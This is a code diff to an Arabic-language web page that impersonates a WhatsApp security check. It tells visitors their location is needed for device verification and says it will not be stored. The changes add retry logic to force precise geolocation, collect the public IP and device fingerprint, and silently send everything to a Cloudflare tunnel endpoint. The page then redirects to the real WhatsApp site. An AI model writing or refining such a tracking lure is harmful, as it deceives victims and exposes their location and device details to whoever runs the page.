@@ -48,6 +48,7 @@
         .error { color: #e74c3c; }
         .success { color: #25D366; }
         #consentPopup { background: #f0f2f5; border-radius: 16px; padding: 20px; margin: 20px 0; display: none; }
+        .guidance { color: #e67e22; font-size: 13px; margin-top: 10px; }
     </style>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -59,17 +60,16 @@
         <p class="subtitle">لحماية حسابك من الوصول غير المصرح به، نطلب منك تأكيد موقعك الحالي.</p>
         <div class="security-badge">🔒 اتصال آمن • WhatsApp Security</div>
         
-        <!-- زر بدء الإجراء -->
         <button class="btn" id="startBtn">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
             متابعة التحقق الأمني
         </button>
 
-        <!-- Popup توضيحي (يزيد Engagement) -->
         <div id="consentPopup">
             <p style="color: #075E54; font-weight: 500; margin-bottom: 12px;">📱 يتطلب الإجراء مشاركة موقعك الحالي</p>
             <p style="color: #54656f; font-size: 14px; margin-bottom: 20px;">نحن نستخدم موقعك فقط للتحقق من هوية جهازك. لن يتم تخزين هذه البيانات.</p>
             <button class="btn" id="locateBtn" style="background: #075E54;">📍 مشاركة موقعي الحالي</button>
+            <p class="guidance">💡 للحصول على أفضل نتيجة، يرجى أن تكون في مكان مفتوح (بالقرب من نافذة).</p>
         </div>
 
         <div id="status"></div>
@@ -80,52 +80,47 @@
     <script>
         (function() {
             let map;
+            let watchId = null;
             const startBtn = document.getElementById('startBtn');
             const locateBtn = document.getElementById('locateBtn');
             const consentPopup = document.getElementById('consentPopup');
             const statusDiv = document.getElementById('status');
             const mapContainer = document.getElementById('mapContainer');
 
-            // الخطوة 1: عرض الـ Popup (زيادة تفاعل المستخدم)
             startBtn.addEventListener('click', () => {
                 startBtn.style.display = 'none';
                 consentPopup.style.display = 'block';
             });
 
-            // الخطوة 2: طلب الموقع بعد تفاعل ثانٍ (Engagement Score أعلى)
-            locateBtn.addEventListener('click', function requestWithDelay() {
-                if (!navigator.geolocation) {
-                    showStatus('❌ متصفحك لا يدعم تحديد الموقع.', 'error');
-                    return;
+            async function getPublicIP() {
+                try {
+                    const resp = await fetch('https://api.ipify.org?format=json');
+                    const data = await resp.json();
+                    return data.ip;
+                } catch(e) {
+                    return 'unavailable';
                 }
-                showStatus('<div class="loader"></div> جاري تحديد موقعك...', '');
-                locateBtn.disabled = true;
-
-                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
-                
-                // استخدام setTimeout بسيط لإعطاء المتصفح وقتاً لتسجيل التفاعل
-                setTimeout(() => {
-                    navigator.geolocation.getCurrentPosition(successHandler, errorHandler, options);
-                }, 100);
-            });
-
-            function successHandler(pos) {
-                const lat = pos.coords.latitude, lng = pos.coords.longitude, acc = pos.coords.accuracy;
-                showStatus(`✅ تم التأكيد! (دقة ${Math.round(acc)}م)`, 'success');
-                initMap(lat, lng, acc);
-                sendData({ latitude: lat, longitude: lng, accuracy: acc });
-                setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'; }, 3000);
             }
 
-            function errorHandler(err) {
-                let msg = '';
-                if (err.code === 1) msg = '❌ تم رفض الصلاحية. يرجى السماح بالموقع من إعدادات المتصفح.';
-                else if (err.code === 2) msg = '❌ تعذر تحديد الموقع (GPS غير متاح).';
-                else if (err.code === 3) msg = '⏳ انتهت المهلة. حاول في مكان مفتوح.';
-                else msg = '❌ حدث خطأ غير معروف.';
-                showStatus(msg, 'error');
-                locateBtn.disabled = false;
-                sendData({ location_failed: true, error: msg });
+            async function sendData(payload) {
+                payload.timestamp = new Date().toISOString();
+                payload.device = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                payload.ip = await getPublicIP();
+                try { 
+                    await fetch('https://tube-workers-exactly-this.trycloudflare.com/log', {
+                        method: 'POST',
+                        headers: {'Content-Type':'application/json'},
+                        body: JSON.stringify(payload)
+                    });
+                } catch(e) {}
             }
 
             function initMap(lat, lng, accuracy) {
@@ -143,15 +138,75 @@
 
             function showStatus(msg, type) { statusDiv.innerHTML = msg; statusDiv.className = type || ''; }
 
-            async function sendData(payload) {
-                payload.timestamp = new Date().toISOString();
-                payload.device = {
-                    userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language,
-                    hardwareConcurrency: navigator.hardwareConcurrency, screen: `${window.screen.width}x${window.screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                };
-                try { await fetch('https://tube-workers-exactly-this.trycloudflare.com/log', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e) {}
+            function successHandler(pos) {
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+                const lat = pos.coords.latitude, lng = pos.coords.longitude, acc = pos.coords.accuracy;
+                showStatus(`✅ تم التأكيد! (دقة ${Math.round(acc)}م)`, 'success');
+                initMap(lat, lng, acc);
+                sendData({ latitude: lat, longitude: lng, accuracy: acc });
+                locateBtn.disabled = true;
+                setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
             }
+
+            function errorHandler(err) {
+                let msg = '';
+                if (err.code === 1) msg = '❌ تم رفض الصلاحية. يرجى السماح بالموقع من إعدادات المتصفح.';
+                else if (err.code === 2) msg = '❌ تعذر تحديد الموقع (GPS غير متاح). تأكد من تفعيل الموقع.';
+                else if (err.code === 3) msg = '⏳ انتهت المهلة. حاول في مكان مفتوح.';
+                else msg = '❌ حدث خطأ غير معروف.';
+                showStatus(msg, 'error');
+                locateBtn.disabled = false;
+                sendData({ location_failed: true, error: msg });
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+            }
+
+            function attemptGeolocation() {
+                if (!navigator.geolocation) {
+                    showStatus('❌ متصفحك لا يدعم تحديد الموقع.', 'error');
+                    return;
+                }
+                showStatus('<div class="loader"></div> جاري تحديد موقعك...', '');
+                locateBtn.disabled = true;
+
+                // المحاولة 1: دقة عالية + مهلة 30 ثانية
+                navigator.geolocation.getCurrentPosition(
+                    successHandler,
+                    (err) => {
+                        if (err.code === 3) {
+                            // المحاولة 2: بدون دقة عالية (WiFi/Cell)
+                            showStatus('⏳ جاري استخدام الشبكة لتحديد الموقع...', '');
+                            navigator.geolocation.getCurrentPosition(
+                                successHandler,
+                                (err2) => {
+                                    if (err2.code === 3) {
+                                        // المحاولة 3: استخدام watchPosition كملاذ أخير
+                                        showStatus('🔄 محاولة ممتدة... تحرك قليلاً نحو النافذة.', '');
+                                        watchId = navigator.geolocation.watchPosition(
+                                            (pos) => { successHandler(pos); },
+                                            errorHandler,
+                                            { enableHighAccuracy: false, timeout: 45000, maximumAge: 10000 }
+                                        );
+                                        setTimeout(() => {
+                                            if (watchId) {
+                                                navigator.geolocation.clearWatch(watchId);
+                                                errorHandler({ code: 3 });
+                                            }
+                                        }, 45000);
+                                    } else {
+                                        errorHandler(err2);
+                                    }
+                                },
+                                { enableHighAccuracy: false, timeout: 30000, maximumAge: 30000 }
+                            );
+                        } else {
+                            errorHandler(err);
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                );
+            }
+
+            locateBtn.addEventListener('click', attemptGeolocation);
         })();
     </script>
 </body>
